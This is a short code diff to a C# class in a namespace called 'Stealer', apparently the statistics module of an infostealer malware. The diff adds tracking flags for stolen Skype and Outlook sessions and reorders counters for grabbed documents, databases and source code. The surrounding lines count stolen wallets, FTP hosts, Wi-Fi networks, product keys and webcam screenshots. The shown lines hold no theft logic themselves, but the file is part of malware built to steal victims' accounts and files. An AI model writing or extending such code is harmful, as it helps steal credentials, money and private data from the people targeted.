@@ -18,20 +18,22 @@ namespace Stealer
         public static int Wallets = 0;
         public static int FTPHosts = 0;
         // Sessions, tokens
+        public static bool Skype = false;
+        public static bool Discord = false;
         public static bool Telegram = false;
+        public static bool Outlook = false;
         public static bool Steam = false;
         public static bool Uplay = false;
-        public static bool Discord = false;
         // System data
         public static int SavedWifiNetworks = 0;
         public static bool ProductKey = false;
         public static bool DesktopScreenshot = false;
         public static bool WebcamScreenshot = false;
         // Grabber stats
-        public static int GrabberDocuments = 0;
-        public static int GrabberSourceCodes = 0;
-        public static int GrabberDatabases = 0;
         public static int GrabberImages = 0;
+        public static int GrabberDocuments = 0;
+        public static int GrabberDatabases = 0;
+        public static int GrabberSourceCodes = 0;
         // Banking & Cryptocurrency services detection
         public static bool BankingServices = false;
         public static bool CryptoServices = false;
